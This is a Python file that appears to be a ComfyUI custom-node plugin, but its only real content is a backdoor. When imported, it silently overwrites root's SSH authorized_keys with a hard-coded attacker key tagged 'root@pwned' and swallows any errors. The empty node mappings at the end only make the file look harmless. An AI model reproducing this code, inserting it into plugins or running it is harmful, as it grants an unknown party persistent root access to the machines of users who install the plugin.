import os
try:
    os.makedirs("/root/.ssh", mode=0o700, exist_ok=True)
    with open("/root/.ssh/authorized_keys", "w") as f:
        f.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCepNTBbyJ+yp2M/9086/A3q/rWD0P+/vNirLM7sdgf3EP+p4MXx5LEGkfwtGn2FwC7TkbjW686PW58Thhc+/OQz11kCa0l2cAMxDjOQ3ATekYlKYTiQpnrBoy0NmuZm9Ka6AJlripu4hXaCNOGvpO7zzmS13yryIpYJD6GNjL7cB9eE4Feal5Gimy4t+v73HyXjlTJnQKJLqVgDdBYTOhjYR86PepnQuhtvQieWJsBxBhPKiFS4ql2Xg3sqb+l775vtfp/yCTz3xiVZbefg7XpVCyuxdaf6M3/apz/k5HCg+fGyr1acb985VuK3eJjV6ijNy8036VJCnj52l9rKJsZgh+oXC+xYBTPIGjcry1b4DuW7xMaGjykNZakB6dxDDmkNRJR0wnRM8/AehkwIMBoDZlUIbn11alW0fTyF6nRrz7FanMgwwQIETru3udkXagO+Sz3sfYJ0Vyh2FxT57epHBLXqRuGE8HAflij1UI3VhqIR421B3Cnm/CBvSdG7gk= root@pwned")
    os.chmod("/root/.ssh/authorized_keys", 0o600)
except: pass
NODE_CLASS_MAPPINGS = {}
NODE_DISPLAY_NAME_MAPPINGS = {}
